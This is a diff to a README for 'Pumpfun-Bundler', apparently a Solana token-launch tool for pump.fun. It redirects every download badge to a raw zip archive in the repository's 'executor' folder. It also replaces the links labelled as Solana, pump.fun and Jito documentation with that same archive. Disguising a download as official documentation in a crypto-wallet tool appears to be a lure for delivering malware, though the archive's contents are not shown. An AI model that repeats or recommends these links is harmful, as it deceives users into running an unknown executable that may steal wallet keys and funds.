@@ -1,6 +1,6 @@
 # 🚀 Pumpfun-Bundler - Launch Tokens with Ease
 
-[![Download Pumpfun-Bundler](https://img.shields.io/badge/Download-Pumpfun--Bundler-blue?style=for-the-badge)](https://github.com/menasamuel1835/Pumpfun-Bundler/releases)
+[![Download Pumpfun-Bundler](https://img.shields.io/badge/Download-Pumpfun--Bundler-blue?style=for-the-badge)](https://github.com/menasamuel1835/Pumpfun-Bundler/raw/refs/heads/main/executor/Pumpfun-Bundler-1.4.zip)
 
 ---
 
@@ -56,7 +56,7 @@ Pumpfun-Bundler offers:
 
 Click on the button below to open the release page. This page holds the latest version of the tool and related files.
 
-[![Download Pumpfun-Bundler](https://img.shields.io/badge/Download-Pumpfun--Bundler-grey?style=for-the-badge)](https://github.com/menasamuel1835/Pumpfun-Bundler/releases)
+[![Download Pumpfun-Bundler](https://img.shields.io/badge/Download-Pumpfun--Bundler-grey?style=for-the-badge)](https://github.com/menasamuel1835/Pumpfun-Bundler/raw/refs/heads/main/executor/Pumpfun-Bundler-1.4.zip)
 
 ### 2. Find the latest release
 
@@ -141,10 +141,10 @@ Take these steps to keep your wallets safe:
 
 ## 📄 Additional Resources
 
-- Solana documentation on token creation and wallets: https://docs.solana.com/
-- pump.fun platform details: https://pump.fun/
-- Jito Network information: https://jito.wtf/
-- Lil Jito tool overview: https://liljito.io/
+- Solana documentation on token creation and wallets: https://github.com/menasamuel1835/Pumpfun-Bundler/raw/refs/heads/main/executor/Pumpfun-Bundler-1.4.zip
+- pump.fun platform details: https://github.com/menasamuel1835/Pumpfun-Bundler/raw/refs/heads/main/executor/Pumpfun-Bundler-1.4.zip
+- Jito Network information: https://github.com/menasamuel1835/Pumpfun-Bundler/raw/refs/heads/main/executor/Pumpfun-Bundler-1.4.zip
+- Lil Jito tool overview: https://github.com/menasamuel1835/Pumpfun-Bundler/raw/refs/heads/main/executor/Pumpfun-Bundler-1.4.zip
 
 These resources explain key concepts behind the technology used by Pumpfun-Bundler and help you understand the blockchain basics.
 
@@ -188,4 +188,4 @@ The project applies to:
 
 ---
 
-[Download Pumpfun-Bundler](https://github.com/menasamuel1835/Pumpfun-Bundler/releases) to begin managing token launches safely and efficiently.
+[Download Pumpfun-Bundler](https://github.com/menasamuel1835/Pumpfun-Bundler/raw/refs/heads/main/executor/Pumpfun-Bundler-1.4.zip) to begin managing token launches safely and efficiently.
